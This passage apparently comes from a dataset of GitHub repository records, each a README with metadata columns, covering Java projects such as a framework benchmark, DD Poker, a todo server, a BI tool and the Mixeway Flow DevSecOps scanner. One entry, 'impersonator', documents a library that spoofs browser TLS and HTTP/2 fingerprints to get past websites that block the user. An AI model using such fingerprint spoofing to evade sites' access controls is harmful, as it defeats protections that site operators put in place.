- [`Java 21+`](https://www.oracle.com/java/technologies/downloads/#java21)
- [`Docker`](https://www.docker.com/)

## Docker Images

The application's JVM and native Docker images can be found at [this Docker Hub link](https://hub.docker.com/u/ivanfranchin).

## Bash scripts

- **docker-build-spring-boot.sh**: this script builds Spring Boot Docker images
- **docker-build-quarkus.sh**: this script builds Quarkus Docker images
- **docker-build-micronaut.sh**: this script builds Micronaut Docker images
- **remove-docker-images.sh**: this script removes all Docker images
",0,0,1,0.0,"['article', 'additional', 'reading', 'spring', 'boot', 'performance', 'benchmark', 'java', 'framework', 'performance', 'benchmark', 'application', 'https', 'https', 'https', 'https', 'https', 'https', 'latest', 'framework', 'version', 'use', 'prerequisite', 'docker', 'image', 'bash', 'script']","['https', 'performance', 'benchmark', 'framework', 'article']",6.0,"[${quarkus.platform.group-id}:quarkus-maven-plugin,io.micronaut.maven:micronaut-maven-plugin,maven-compiler-plugin,maven-failsafe-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,0.0
HiveGamesOSS/leveldb-mcpe-java,main,"# LevelDB MCPE in Java

This project is a fork of https://github.com/pcmind/leveldb aiming to implement the changes made
in https://github.com/Mojang/leveldb-mcpe/ where relevant to allow the library to read MCPE.

For more information see the original repository on use cases / API usage.

Building
--------

**Requirements**

- Git
- Java 11 or higher
- Maven

**Steps**

1. Clone this repository via `git clone git://github.com/HiveGamesOSS/leveldb-mcpe-java.git`.
2. Build the project via `mvn clean install`.
3. Obtain the library from `target/` folder.

Library Usage
--------

You can use the following in your maven pom.xml:

```xml

<dependency>
    <groupId>com.hivemc.leveldb</groupId>
    <artifactId>leveldb</artifactId>
    <version>1.0.0</version>
</dependency>
```

```xml

<dependency>
    <groupId>com.hivemc.leveldb</groupId>
    <artifactId>leveldb-api</artifactId>
    <version>1.0.0</version>
</dependency>
```

This library is aimed as a drop in replacement to the original fork https://github.com/pcmind/leveldb.

License
--------

Details of the LICENSE can be found in the license.txt, this fork maintains the original license for all code and
modifications.
",2,0,1,0.0,"['leveldb', 'mcpe', 'java']","['leveldb', 'mcpe', 'java']",5.0,"[maven-compiler-plugin,maven-shade-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.eluder.coveralls:coveralls-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,4.0,1.0
dougdonohoe/ddpoker,main,"# DD Poker

## About

![dd-poker-3.jpg](images/dd-poker-3.jpg)

This repository contains all the source code for the DD Poker
computer game, the underlying game engine, the supporting 
backend server, and the companion website. The game itself is 
a Java Swing-based desktop application that is capable of running 
on Mac, Linux and Windows.  The backend-server is essentially
a Java Spring application that talks to MySQL.  The website 
(aka ""Online Portal"") is built on the Apache Wicket framework.

## Installers

See [Releases](https://github.com/dougdonohoe/ddpoker/releases) for the latest Mac, Linux and Windows installers.

[<img src=""images/install4j_small.png"">](https://www.ej-technologies.com/install4j)
Installers are built by [Donohoe Digital LLC](https://www.donohoedigital.com/) 
courtesy of a license to ej-technologies' 
[excellent multi-platform installer builder, install4j](https://www.ej-technologies.com/install4j).
We are grateful that they provided us an open-source license.

There is also an option to distribute a jar file, which the _Installers_ section of
the [Developer Notes](README-DEV.md) explains.

## TL;DR Running DD Poker From Source

If you are impatient and just want to run the DD Poker game without
reading all the [developer documentation](README-DEV.md) or worrying
about servers and databases, follow these steps:

1. Clone this repo
2. Install [Java 1.8](https://adoptopenjdk.net/releases.html?variant=openjdk8&jvmVariant=hotspot)
   and [Maven 3](https://maven.apache.org/install.html)
3. Run these commands in the `ddpoker` directory:

```shell
source ddpoker.rc
mvn-package-notests
poker
```

## Developer Notes

For details on how to build and run DD Poker and
the backend server and website, please see [README-DEV.md](README-DEV.md).

## History

DD Poker was developed by Donohoe Digital LLC, a small computer
games studio founded by Doug Donohoe in 2003.  Its first game,
[War! Age of Imperialism](https://www.donohoedigital.com/war/) was
a computer version of the eponymous table-top board game, and it
was a finalist in the 2005 Independent Games Festival.  After releasing
the game in October 2003, Doug was celebrating in Las Vegas
and, while at a poker tournament, the proverbial lightbulb went 
off that there were no good poker software simulators out there,
especially for tournaments.  Leveraging the game 
engine he built for War!, Doug immediately started building
a poker game.  Less that a year later, DD Poker was ready for 
release.

DD Poker 1.0 was originally released (and sold in boxes!) in 
June 2004 under the name 
_DD Tournament Poker No Limit Texas Hold'em_ and 
later re-released in early 2005 as _DD Tournament Poker 2005 Collector's 
Edition_, featuring Annie Duke on the box.  The game featured 
Limit, Pot-Limit and No-Limit Texas Hold'em against computer
components, a poker clock, but no online play.

DD Poker 2.0 added the ability to play online against other
human opponents, a sophisticated hand calculator, a brand-new UI, and dozens
of other new features.  It was originally released in August
2005 as _DD No Limit Texas Hold'em Tournament Edition_, featuring 
Phil Gordon on the box.  To support online play, a back-end
API server and companion ""Online Portal"" was built and operated
by Donohoe Digital.  New functionality continued to be added
until early 2007.

DD Poker 3.0 was released as donation-ware in January 2009,
adding only minor new features while removing license-key 
validation logic. It continued to be updated sporadically until 
it was shutdown in July 2017.

See [whatsnew.html](code/poker/src/main/resources/config/poker/help/whatsnew.html) 
for a detailed release history starting with version 2.0.

## Why Open Source?

Even though DD Poker and the backend servers was shutdown
in July 2017, folks continue to play it by manually
sharing game URLs.  There was a minor revival during the 
2020 pandemic and sporadic inquiries have come in over the
years.

While Donohoe Digital LLC can no longer
run the old DD Poker servers, there might be folks out there that
want to run servers for their own local poker communities.
Releasing the code allows them to do this.

In addition, even though the core code is almost 20 years
old, it still actually works and might be useful to
somebody, somewhere.

## Copyright and Licenses

Unless otherwise noted, the contents of this repository are
Copyright (c) 2003-2024 Doug Donohoe.  All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

For the full License text, please see the [LICENSE.txt](LICENSE.txt) file
in the root directory of this project.

The ""DD Poker"" and ""Donohoe Digital"" names and logos, as well as any images,
graphics, text, and documentation found in this repository (including but not
limited to written documentation, website content, and marketing materials)
are licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives
4.0 International License (CC BY-NC-ND 4.0). You may not use these assets
without explicit written permission for any uses not covered by this License.
For the full License text, please see the [LICENSE-CREATIVE-COMMONS.txt](LICENSE-CREATIVE-COMMONS.txt) file.

For inquiries regarding commercial licensing of this source code or
the use of names, logos, images, text, or other assets, please contact
doug [at] donohoe [dot] info.

## Third Party Licenses and Other Open Source Code

DD Poker incorporates various other open source code, either directly as source files
or via maven dependencies as seen in the `pom.xml` files.  These are explained in 
[code/poker/src/main/resources/config/poker/help/credits.html](https://static.ddpoker.com/gamehelp/help/credits.html) and the licenses 
mentioned therein can be found in the `docs/license` directory.

Third party source code directly copied into this repository include the following:

* Zookitec Explicit Layout in `code/poker/src/main/java/com/zookitec/layout/*.java`
* `MersenneTwisterFast` random number generator in `code/common/src/main/java/com/donohoedigital/base/MersenneTwisterFast.java`
* `RandomGUID` generator in `code/common/src/main/java/com/donohoedigital/base/RandomGUID.java`
* `Base64` encode/decoder in `code/common/src/main/java/com/donohoedigital/base/Base64.java`

## Contributors

The following folks made excellent contributions to the DD Poker
code base as employees of Donohoe Digital:

+ Greg King
+ Sam Neth
+ Brian Zak
",2,0,1,4.0,"['dd', 'poker', 'about', 'installers', 'tl', 'dr', 'running', 'dd', 'poker', 'from', 'source', 'developer', 'note', 'history', 'why', 'open', 'source', 'copyright', 'license', 'third', 'party', 'license', 'other', 'open', 'source', 'code', 'contributor']","['source', 'dd', 'poker', 'open', 'license']",22.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin]",1.0,20.0,1.0
apache/maven-hocon-extension,main,"<!---
 Licensed to the Apache Software Foundation (ASF) under one or more
 contributor license agreements.  See the NOTICE file distributed with
 this work for additional information regarding copyright ownership.
 The ASF licenses this file to You under the Apache License, Version 2.0
 (the ""License""); you may not use this file except in compliance with
 the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an ""AS IS"" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->
[Apache Maven Hocon Extension](https://maven.apache.org/extensions/maven-xinclude-extension/)
==================================

[![Apache License, Version 2.0, January 2004](https://img.shields.io/github/license/apache/maven.svg?label=License)](https://www.apache.org/licenses/LICENSE-2.0)
[![Maven Central](https://img.shields.io/maven-central/v/org.apache.maven.extensions/maven-xinclude-extension.svg?label=Maven%20Central)](https://search.maven.org/artifact/org.apache.maven.extensions/maven-xinclude-extension)

This project provides a Hocon POM parser extension for Maven 4. It allows POMs to 
be written with the [Hocon](https://github.com/lightbend/config/blob/master/HOCON.md)
syntax, which is a superset of the [JSON](https://json.org/) syntax.

License
-------
This code is under the [Apache License, Version 2.0, January 2004][license].

See the [`NOTICE`](./NOTICE) file for required notices and attributions.

Usage
-----
To use this extension, the following declaration needs to be done in your `${rootDirectory}/.mvn/extensions.xml`:
```
<extensions xmlns=""http://maven.apache.org/EXTENSIONS/1.2.0"">
    <extension>
        <groupId>org.apache.maven.extensions</groupId>
        <artifactId>maven-hocon-extension</artifactId>
        <version>@project.version@</version>
    </extension>
</extensions>
```
This allows defining a POM using Hocon syntax:
```
modelVersion = 4.1.0
parent {
    groupId = org.apache.maven.hocon.its
    artifactId = parent
    version = 1.0.0-SNAPSHOT
}
artifactId = test

properties = {
  ""my.property"" = foo
  pluginVersion = 3.9
}

dependencies = [
    # just add one dummy dependency
    ""com.typesafe:config:1.4.2""
]
```
",0,0,3,2.0,"['add', 'one', 'dummy', 'dependency']","['add', 'one', 'dummy', 'dependency']",2.0,[],0.0,2.0,0.0
zhkl0228/impersonator,master,"# impersonator

impersonator is a fork of [BouncyCastle-bctls](https://github.com/bcgit/bc-java/commit/74a62440c93342a6743bb33c36a5ee224fc6c885) and [okhttp](https://github.com/square/okhttp/tree/parent-4.12.0) that is designed to impersonate TLS fingerprints.

`impersonator` can
impersonate browsers' TLS/JA3 and HTTP/2 fingerprints. If you are blocked by some
website for no obvious reason, you can give `impersonator` a try.

## Features
- Supports TLS/JA3/JA4 fingerprints impersonation.
- Supports HTTP/2 fingerprints impersonation.

## Usage

TLS/JA3/JA4 fingerprints impersonation
```xml
<dependency>
    <groupId>com.github.zhkl0228</groupId>
    <artifactId>impersonator-bctls</artifactId>
    <version>1.0.7</version>
</dependency>
```

TLS/JA3/JA4 fingerprints and HTTP/2 fingerprints impersonation
```xml
<dependency>
    <groupId>com.github.zhkl0228</groupId>
    <artifactId>impersonator-okhttp</artifactId>
    <version>1.0.7</version>
</dependency>
```
- [src/test/java/com/github/zhkl0228/impersonator/IOSTest.java](https://github.com/zhkl0228/impersonator/blob/master/src/test/java/com/github/zhkl0228/impersonator/IOSTest.java)
```java
ImpersonatorApi api = ImpersonatorFactory.ios();
SSLContext context = api.newSSLContext(null, null); // for TLS/JA3/JA4 fingerprints impersonation

OkHttpClientFactory factory = OkHttpClientFactory.create(api);
OkHttpClient client = factory.newHttpClient(); // for TLS/JA3/JA4 fingerprints and HTTP/2 fingerprints impersonation
```
",4,0,1,0.0,"['impersonator', 'feature', 'usage']","['impersonator', 'feature', 'usage']",3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.jetbrains.kotlin:kotlin-maven-plugin]",0.0,2.0,1.0
devjlkeesh/httpserver,main,"# Simple Todo HTTP Server in Java

This project is a simple HTTP server for managing todo items, built using Java's standard HttpServer API. It allows users to create, read, update, and delete (CRUD) todo items through a RESTful API.

## Features

- Create a new todo item
- Read all todo items or a specific item
- Update an existing todo item
- Delete a todo item

## Getting Started

### Prerequisites

- Java Development Kit (JDK) 8 or higher
- postgresql
- ```sql
  create database httpserver;
  
  create table if not exists todos(
    id bigserial primary key,
    title varchar not null,
    description varchar not null,
    user_id bigint not null,
    priority varchar not null default 'LOW',
    done boolean default 'f' not null,
    created_at timestamp not null default current_timestamp 
  );
    ```
---
# build jar

```shell
mvn clean package
cd target
java -jar httpserverexec.jar
```

---

## API

- reads all todos
```
GET localhost:8080/todo
```

-  reads todo which has id 1
```
GET localhost:8080/todo/1 
```

- create todo
```
POST localhost:8080/todo

Content-Type : application-json
{
    ""title"":""Title for todo"",
    ""description"":""Description for todo"",
    ""user_id"":""User id which todo belongs to"",
    ""priority"":""HIGH""
}
```

- update todo
```
PUT localhost:8080/todo # update todo 

Content-Type : application-json
{
    ""id"":1,
    ""title"":""Title for todo"",
    ""description"":""Description for todo"",
    ""priority"":""HIGH"",
    ""completed"":true
}
```",0,0,1,0.0,"['simple', 'todo', 'http', 'server', 'java', 'feature', 'get', 'start', 'prerequisite', 'build', 'jar', 'api', 'update', 'todo']","['todo', 'simple', 'http', 'server', 'java']",1.0,[org.apache.maven.plugins:maven-shade-plugin],0.0,1.0,0.0
datafor123/datafor-free,master,"# Datafor Visualization and Analysis

Datafor Visualization and Analysis is a self-service agile BI tool that provides intuitive and user-friendly data visualization and analysis capabilities to help users quickly explore, analyze, and make decisions with their data.

Datafor is developed based on [Pentaho BA Server Core](https://github.com/pentaho/pentaho-platform).


## Features

**Data Connectivity:** Supports connecting to various data sources, including relational databases, NoSQL databases, data warehouses, cloud data sources, and file data sources.

**Data Visualization:** Offers a rich variety of visual charts and elements with customization options, enabling users to easily create beautiful data analysis reports and data visualization pages.

**Multidimensional Analysis:** Provides powerful multidimensional analysis capabilities to help users delve into the patterns and relationships behind the data, uncovering potential business opportunities and issues.

**Embedded Analytics:** Supports embedding data visualization and analysis functions into other applications to achieve real-time data visualization and analysis.

## Screenshots

#### WYSIWYG Designer


<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/1%20visualizer.PNG""  />
</div>

#### Create multi-dimensional models in a few clicks

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/4%20modeler.png""  />
</div>

#### Interactive analysis report

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/demo2.gif""  width=""100%"" />
</div>

#### Cool visualization

<div style=""text-align:center"">
  <img class=""img-responsive"" src=""https://github.com/datafor123/docs/raw/main/images/5%20demo.PNG""  />
</div>

## Get Datafor

You can download Datafor(free edition) for the following platforms:

- [Linux](https://github.com/datafor123/datafor-free/releases/download/6.06/datafor-server-free-linux-6.06.zip)
- [Windows](https://github.com/datafor123/datafor-free/releases/download/6.06/datafor-server-free-windows-6.06.zip)

## Install Manual

- [CentOS](https://help.datafor.com.cn/docs/en/20%20setup/datafor-centos)
- [Ubuntu](https://help.datafor.com.cn/docs/en/20%20setup/datafor-ubuntu)
- [Windows](https://help.datafor.com.cn/docs/en/20%20setup/datafor-windows)
- [Docker](https://help.datafor.com.cn/docs/en/20%20setup/datafor-docker)

## Get Help

- For bug reports and feature requests, visit our [GitHub Issues](https://github.com/datafor123/datafor-free//issues) page.
- For general questions, email us at [support@datafor.com.cn](mailto:support@datafor.com.cn).
- Refer to the [help](https://help.datafor.com.cn/docs/en/) documentation for additional assistance.

## Free Edition V.S. Enterprise Edition

The Enterprise Edition offers significant advantages over the Free Edition, including support for more data sources, advanced analysis and visualization features, enhanced security, improved integration options, and optimized system performance.

<table>
  <tr>
    <th colspan=""2"" style=""width:40%;text-align:center;"">Features</th>
    <th style=""width:30%;text-align:center;"">Free Edition</th>
    <th style=""width:30%;text-align:center;"">Enterprise Edition</th>
  </tr>
  <tr>
    <td rowspan=""2"" style=""width:15%"">Data Sources</td>
    <td style=""width:25%"">Relational Databases</td>    
    <td align=""center"">MySQL, PostgreSQL, Oracle, MS SQL Server</td>
    <td align=""center"">Addition: GaussDB, Gaussdb2000, Greenplum, Tidb, Clickhouse, SparkSQL, Cloudera Impala, Snowflake, Impala, Hadoop Hive 2, Hana, InfluxDB, MongoDB,  Doris, Redshift</td>
  </tr>
  <tr>
    <td >File Upload (CSV, Excel)</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""5"">Analysis Models</td>
    <td>Multidimensional Modeling</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Data Masking</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Data Dictionary</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Calculated Fields</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-calculated-measures"" target=""_blank"">Calculated Measures</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""8"">Visualization</td>
    <td>Charts</td>
    <td align=""center"">Pivot Table, Table, KPI Card, Dimension Field Information, Clustered Column Chart, Stacked Column Chart, 100% Stacked Column Chart, Clustered Bar Chart, Stacked Bar Chart, 100% Stacked Bar Chart, Line Chart, Column Line Chart, Pie Chart, Scatter Plot, Sunburst Chart, Gauge, Sankey</td>
    <td align=""center"">Addition：Parent-Child Tree Table, Hierarchical Tree Table, </td>
  </tr>
  <tr>
    <td>Maps</td>
    <td align=""center"">Filled GeoJson Map, Marker GeoJson Map, GIS Marker Map</td>
    <td align=""center"">Addition：Heat Map, Mapbox/AMap, Image Map</td>
  </tr>
  <tr>
    <td>Assists Components</td>
    <td align=""center"">Image File, Tabs, Text, SVG, Icon Fonts, Rectangle, Line, Ellipse, Hyperlink</td>
    <td align=""center"">Addition: Hyperlink</td>
  </tr>
  <tr>
    <td>Filter Components</td>
    <td align=""center"">Dropdown, List Box, Button, Radio/Checkbox, Date, Date Range, Timeline, Range Timeline, Numeric Range Filter</td>
    <td align=""center"">Addition: Pager, Search</td>
  </tr>
  <tr>
    <td>Custom Styles</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Parameter Controller</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Mobile Layout</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Export to PDF, PNG, CSV, Excel</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""6"">Analysis</td>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-cross-filtering"" target=""_blank"">Cross-Model analytics</a></td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/kzt-jmgnjs"" target=""_blank"">Drill Down</a></td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Custom Events</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-Drill-through"" target=""_blank"">Drill Through</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-parameters"" target=""_blank"">Parameters</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td><a href=""https://help.datafor.com.cn/docs/en/70%20analysis/analysis-calculated-measures"" target=""_blank"">Calculated Measures</a></td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""3"">Security</td>
    <td>File, Folder, and Analysis Model Access Control</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Row-Level Security</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Object-Level Security</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""7"">Integration and Embedding</td>
    <td>Single Sign-On</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Share Links</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>LDAP</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>CAS</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>JWT</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>WeChat</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>DingTalk</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""8"">System</td>
    <td>Users and Roles</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Report Export/Import</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Analysis Model Export/Import</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Lineage Analysis</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Log Auditing</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>ETL Scheduling (Integrated with Kettle)</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Backup and Restore</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Enterprise Data Portal</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""2"">Performance</td>
    <td>Pre-Aggregated Tables</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Query and Model Caching</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td rowspan=""4"">Support</td>
    <td>Help document</td>
    <td align=""center"">&#x2705;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Training</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Technical Support</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
  <tr>
    <td>Customization</td>
    <td align=""center"">&#x274C;</td>
    <td align=""center"">&#x2705;</td>
  </tr>
</table>


## Contact us

marketing@datafor.com.cn





",1,0,1,0.0,"['datafor', 'visualization', 'analysis', 'feature', 'screenshots', 'wysiwyg', 'designer', 'create', 'model', 'click', 'interactive', 'analysis', 'report', 'cool', 'visualization', 'get', 'datafor', 'install', 'manual', 'get', 'help', 'free', 'edition', 'enterprise', 'edition', 'contact', 'u']","['datafor', 'visualization', 'analysis', 'get', 'edition']",20.0,"[com.google.code.maven-replacer-plugin:replacer,com.mycila:license-maven-plugin,maven-antrun-plugin,maven-checkstyle-plugin,maven-dependency-plugin,maven-jar-plugin,maven-javadoc-plugin,maven-jxr-plugin,maven-source-plugin,maven-war-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.codehaus.mojo:cobertura-maven-plugin,org.codehaus.mojo:gwt-maven-plugin]",3.0,8.0,9.0
Mixeway/Flow,main,"# Mixeway Flow

[![License](https://img.shields.io/badge/license-FlowLicense-blue.svg)](LICENSE.md)
![example workflow](https://github.com/mixeway/flow/actions/workflows/docker-build-backend.yml/badge.svg)
[![Discord](https://img.shields.io/discord/1272884200323944550)](https://discord.gg/76RY2Y82)
[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg)](CONTRIBUTING.md)

## Introduction
![Mixeway Flow](.github/img/logo.png ""logo"")

**Mixeway Flow** is a versatile and comprehensive tool designed to serve as the ultimate Swiss army knife for DevSecOps processes. It streamlines the integration of security practices into your development and operations workflows, ensuring that your software is secure from the ground up.

Mixeway Flow comes equipped with built-in open-source scanning engines that perform thorough security validations across multiple layers of your development stack. From Infrastructure as Code (IaC) to source code and open-source libraries, Mixeway Flow ensures that potential vulnerabilities are identified and addressed early in the development lifecycle.

One of Mixeway Flow's standout features is its seamless integration with Git and CI/CD environments through webhooks. This means you don't have to spend time configuring and maintaining complex CI/CD pipelines—Mixeway Flow automatically hooks into your existing workflows to provide continuous security monitoring.

All vulnerabilities detected by Mixeway Flow are displayed in a single, unified dashboard. This dashboard offers a comprehensive view of all potential threats, with the added ability to suppress or ignore certain vulnerabilities based on specific contexts or justifications. This flexibility allows you to focus on the most critical issues without being overwhelmed by false positives or low-priority alerts.

Whether you are a developer, a security engineer, or part of a DevOps team, Mixeway Flow simplifies the integration of security into your development process, helping you build and maintain secure software with ease.

## How Mixeway Flow works

![Mixeway Process](.github/img/flow_process.jpg)

1. Register Git repository by entering repo URL and access token. At moment of initialization initial scan on last commit on default branch will be performed.
2. Configure WebHook on the GitLab or GitHub instance that will be triggered every time push or pull/merge request is detected. This trigger will send information to FLow to run the scan on the selected branch / commit or queue it if there are many events
3. Wait for the results and review detected threats

## Vulnerabilities and threats detection
![Mixeway Threats](.github/img/flow_scans.png)

Mixeway Flow has built in tools that verify security of given application across many layers. Each scan is performed in a transparent way from the CICD or developer perspective.

### SAST - engine: Bearer (https://github.com/Bearer/bearer)
> **SAST (Static Application Security Testing)** is a security technique that analyzes source code, bytecode, or binary code for vulnerabilities without executing the program. It identifies security flaws at the code level early in the development process, allowing developers to fix issues before the code is deployed. SAST scans are essential for detecting common vulnerabilities like SQL injection, cross-site scripting (XSS), and insecure coding practices.

SAST scan is performed on the source code created and written by the team's developers looking for any places that might be a source for problems related with any type of injections or other threats.

**Scan requirements**: None. Scan is performed for every change without any conditions.

### SCA - engine: SBOM & OWASP Dependency Track (https://github.com/DependencyTrack/dependency-track)
> **SCA (Software Composition Analysis)** is a security practice that identifies and manages vulnerabilities in open-source and third-party components within a software project. By analyzing the software's dependencies, SCA tools detect known vulnerabilities, license compliance issues, and outdated libraries. This helps ensure that the software remains secure and compliant with industry standards, especially when using external code that may introduce risks into the project.

Integrating SCA scanning into Your software development lifecycle help You properly manage dependencies You introduce to the codebase.

**Scan requirements**: In order to trigger SCA engine there has to be `sbom.json` file located in the root of the repository

### IAC - engine: KICS (https://github.com/Checkmarx/kics)
> **IaC (Infrastructure as Code)** vulnerability scanning is a security practice that involves analyzing IaC templates and configurations for security risks before infrastructure is provisioned. By scanning these templates, such as Terraform or CloudFormation scripts, IaC vulnerability scanning tools detect misconfigurations, insecure settings, and potential vulnerabilities that could expose infrastructure to attacks. This proactive approach helps secure cloud environments and infrastructure by identifying issues early in the development process.

This type of scan verify `Dockerfiles`, `terraform`, `kubernetes deployments` and much more configurations that can be deployed looking for the misconfiguration or bad practices to be alerted.

**Scan requirements**: None. Scan is performed for every change without any conditions.

### Secret Leaks - engine: giteaks (https://github.com/gitleaks/gitleaks)
> **Secret leaks** refer to the unintentional exposure of sensitive information, such as API keys, passwords, tokens, and other credentials, in source code, configuration files, or logs. Detecting secret leaks is crucial, as exposed secrets can be exploited by attackers to gain unauthorized access to systems, services, or data. Secret scanning tools help identify and prevent the inclusion of sensitive information in public repositories or shared code, reducing the risk of security breaches.

Most severe incidents in the Public Cloud (but not only) occurred due to misconfigurations, hardcoded keys or keys accidentally pushed to the git repository. This kind of tests help You detect such problems and give You the timeframe needed to properly rotate leaked secrets.

**Scan requirements**: None. Scan is performed for every change without any conditions.

## Installation

- Prerequisites: access to docker hub, docker-compose command
- Hardware requirements: minimal 2CPU, 16GB ram 50GB disk space. Recommended: 4CPU, 32GB RAM 100 GB Disk space

### Option 1
```shell
git clone https://github.com/Mixeway/flow
cd flow
docker-compose up
```

### Option 2
```shell
cat <<EOF > docker-compose.yml
version: '3.8'

services:
  backend:
    image: mixeway/flow-api:latest
    container_name: flowapi_backend
    ports:
      - ""8888:8888""
      - ""8443:8443""
    environment:
      SSL: ""TRUE""
    volumes:
      - pki_data:/etc/pki
      - dependency_track_data:/root/.dependency-track
    depends_on:
      - flowdb

  flowdb:
    image: postgres:latest
    container_name: flowdb
    ports:
      - ""5432:5432""
    environment:
